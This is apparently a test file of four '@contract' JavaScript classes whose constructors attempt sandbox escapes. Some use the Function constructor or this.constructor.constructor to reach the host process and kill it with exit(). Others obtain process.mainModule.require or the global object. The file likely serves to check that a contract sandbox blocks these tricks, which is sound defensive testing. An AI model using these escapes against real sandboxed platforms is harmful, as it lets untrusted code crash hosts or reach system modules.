@contract class Hack1 {
    constructor() {
        new Function("return process")().exit()
    }
}

@contract class Hack2 {
    constructor() {
        this.constructor.constructor("return process")().exit()
    }
}

@contract class Hack3 {
    constructor() {
        const require = new Function("return process.mainModule.require")();
        console.log(require);
    }
}

@contract class Hack4 {
    constructor() {
        const global = new Function("return global")();
        console.log(global);
    }
}

